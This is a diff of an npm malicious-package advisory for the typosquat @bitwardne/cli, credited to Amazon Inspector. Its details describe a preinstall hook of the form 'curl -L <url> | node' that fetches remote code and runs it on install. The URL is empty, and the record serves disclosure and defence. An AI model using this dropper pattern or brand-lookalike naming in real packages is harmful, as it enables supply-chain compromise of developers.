@@ -1,14 +1,15 @@
 {
-  "schema_version": "1.7.4",
-  "published": "2026-10-08T16:53:40Z",
   "modified": "2026-10-08T16:53:40Z",
-  "summary": "@bitwardne/cli preinstall pipes curl output to node (install-time RCE dropper shape)",
-  "details": "package.json declares a preinstall lifecycle script of the form 'curl -L <url> | node', which fetches remote content and executes it in Node at npm install time. In this published version the URL slot is empty so the command fails as shipped, but the script shape is a canonical install-time remote-code-execution dropper that fires automatically on `npm install`. The package is published under the @bitwardne scope — a one-character variation of the Bitwarden brand — while the shipped source is a verbatim copy of the unrelated 'cli' option-parser library by Chris O'Hara (homepage node-js-libs/cli), with no legitimate connection between the scope name and the vendored code.",
+  "published": "2026-10-08T16:53:40Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-17693",
+  "summary": "Malicious code in @bitwardne/cli (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (cf7d0b3168a3a56cb6208688970e6109a964ccfb99a97fe7061d57e007b67ca6)\npackage.json declares a preinstall lifecycle script of the form 'curl -L \u003curl\u003e | node', which fetches remote content and executes it in Node at npm install time. In this published version the URL slot is empty so the command fails as shipped, but the script shape is a canonical install-time remote-code-execution dropper that fires automatically on `npm install`. The package is published under the @bitwardne scope — a one-character variation of the Bitwarden brand — while the shipped source is a verbatim copy of the unrelated 'cli' option-parser library by Chris O'Hara (homepage node-js-libs/cli), with no legitimate connection between the scope name and the vendored code.\n",
   "affected": [
     {
       "package": {
-        "name": "@bitwardne/cli",
-        "ecosystem": "npm"
+        "ecosystem": "npm",
+        "name": "@bitwardne/cli"
       },
       "versions": [
         "1.0.1"
@@ -48,6 +49,15 @@
       "url": "https://www.npmjs.com/package/@bitwardne/cli/v/1.0.1"
     }
   ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
   "database_specific": {
     "malicious-packages-origins": [
       {
@@ -61,14 +71,5 @@
         ]
       }
     ]
-  },
-  "credits": [
-    {
-      "name": "Amazon Inspector",
-      "contact": [
-        "inspector-research@amazon.com"
-      ],
-      "type": "FINDER"
-    }
-  ]
+  }
 }
